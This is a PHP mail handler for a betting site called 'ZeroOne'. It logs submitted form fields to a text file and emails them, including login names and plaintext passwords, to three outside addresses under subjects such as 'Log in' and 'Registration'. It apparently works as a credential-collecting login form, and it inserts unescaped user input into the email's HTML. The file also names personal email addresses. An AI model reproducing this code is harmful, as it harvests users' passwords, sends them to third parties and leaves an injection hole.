<?php

if ( empty($_POST) ) {

	exit;

}

require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;

// логируем письма

$log = date('d.m.y H:i') . "\r\n";

foreach ( $_POST as $key => $value ) {

	if ( in_array( $key , array('subject', 'password') ) ) {

		continue;

	}

	$log .= $value . "\r\n";

}

$log .= "___________\r\n";

$fp = fopen('log-mail.txt', "a");
fwrite($fp, $log);
fclose($fp);

// отправляем письмо

$mail = new PHPMailer();

//Recipients
$mail->setFrom('info@zeroone.bet', 'ZeroOne');
$mail->addAddress('79198889134@ya.ru');
$mail->addAddress('Slezin.i@gmail.com');
$mail->addAddress('me@artin.studio');

//Content

$html = '';

if ( empty($_POST['name']) === false ) {

	$html .= '<b>Имя:</b> ' . $_POST['name'];

}

if ( empty($_POST['login']) === false ) {

	$html .= '<b>Логин:</b> ' . $_POST['login'];

}

if ( empty($_POST['email']) === false ) {

	$html .= '<br><b>E-mail:</b> ' . $_POST['email'];

}
if ( empty($_POST['nick']) === false ) {

	$html .= '<br><b>Ваш ник:</b> ' . $_POST['nick'];

}

if ( empty($_POST['password']) === false ) {

	$html .= '<br><b>Пароль:</b> ' . $_POST['password'];

}

if ( empty($_POST['telegram']) === false ) {

	$html .= '<br><b>Телеграм:</b> ' . $_POST['telegram'];

}


if ( $_POST['subject'] === 'bid' ) {

	$html .= '<br><b>Валюта для оплаты:</b> ' . $_POST['currency'];
	$html .= '<br><b>Выберите игру:</b> ' . $_POST['game'];

}

$subject = 'Войти';

if ( $_POST['subject'] === 'modal-reg' ) {

	$subject = 'Регистрация';

}

if ( $_POST['subject'] === 'feedback' ) {

	$subject = 'Оставайся на связи';

}

if ( in_array( $_POST['subject'] , array('bid', 'bid-reg') ) ) {

	$subject = 'Поставь на победу';

}

$mail->CharSet  = 'UTF-8';
$mail->Subject = $subject;
$mail->msgHTML($html);


//send the message, check for errors

$success = new class{};

if ( $mail->send() ) {

	$success->status = "ok";

} else {

	$success->status = "error";
	$success->message = $mail->ErrorInfo;

}

echo json_encode( $success );